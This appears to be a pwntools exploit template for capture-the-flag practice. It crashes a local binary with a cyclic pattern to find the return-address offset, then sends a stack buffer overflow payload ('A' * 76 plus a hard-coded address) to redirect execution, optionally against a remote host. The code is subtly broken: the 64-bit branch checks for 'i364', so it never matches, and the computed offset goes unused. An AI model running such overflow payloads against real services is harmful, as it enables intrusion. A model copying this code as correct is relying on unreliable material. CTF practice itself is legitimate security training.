from pwn import *


# ===========================================================
#                    CONFIG STARTS HERE
# ===========================================================

# Specify GDB script here (breakpoints etc)
gdbscript = '''
break main
continue
'''.format(**locals())

# Binary filename [CHANGE THIS]
exe = './file'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=True)

# File architecture (x86 or x64)
architecture = elf.arch
print(architecture)

# Change logging level to help with debugging (warning < info < debug)
context.log_level = 'debug'

#set prompt from program to listen for
prompt = "What do you have to say?" #[Change this]

# ===========================================================
#                    CONFIG ENDS HERE
# ===========================================================

#func to start the target program with gdb, remotely, or normally
def start(argv=[], *a, **kw):
    if args.GDB: #if user wants to run with gdb
        #specify gdb script
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: #if user wants to run against remote (host, port)
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: #user wants to run locally
        return process([exe] + argv, *a, **kw)

#func to find the EIP/RIP of a program by 
#creating a seg fault and analysing the core dump
def find_ip(payload, architecture, prompt):
    #start the program
    p = process(exe)
    #send payload after the prompt is received
    p.sendlineafter(prompt, payload)
    #wait for a crash
    p.wait()
    #print out the EIP/RIP at time of crash
    if architecture == "i386":
        ip_offset = cyclic_find(p.corefile.pc) #get ip_offset for x86
    elif architecture == "i364":
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) #get ip_offset for x64
    else:
        print("Invalid architecture value supplied. Breaking.")
        exit(1)

    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


def main():
    # ===========================================================
    #                    EXPLOIT STARTS HERE
    # ===========================================================



    # Pass in pattern_size, get back EIP/RIP offset
    offset = find_ip(cyclic(1000), architecture, prompt)

    # Start program
    io = start()

    #building the payload

    pprint(elf.got)

    flag_addr = "\x76\x85\x04\x08"

    """ payload = flat({
        offset: [
            flag_addr
        ]
    } """

    #print("payload1: {}".format(payload))
    payload = "A" * 76 + flag_addr

    io.sendlineafter(prompt, payload)

    io.interactive()



if __name__ == "__main__":
    main()